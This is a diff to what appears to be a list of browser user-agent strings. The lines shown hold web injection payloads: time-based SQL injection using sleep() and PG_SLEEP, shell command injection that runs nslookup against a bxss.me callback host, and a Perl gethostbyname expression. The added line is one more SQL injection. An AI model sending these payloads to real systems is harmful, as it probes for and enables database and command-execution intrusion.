@@ -1631,3 +1631,4 @@ Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) 
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'||sleep(27*1000)*tmkems||')
 &nslookup -q=cname hitonlwfbtifaa4d34.bxss.me&'""`0&nslookup -q=cname hitonlwfbtifaa4d34.bxss.me&`'
 "".gethostbyname(lc(""hityi"".""zlltgjac64b02.bxss.me."").""A"".chr(67).chr(hex(""58"")).chr(102).chr(78).chr(112).chr(78)."")
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36RIj1B3qM')) OR 672=(SELECT 672 FROM PG_SLEEP(15))--)
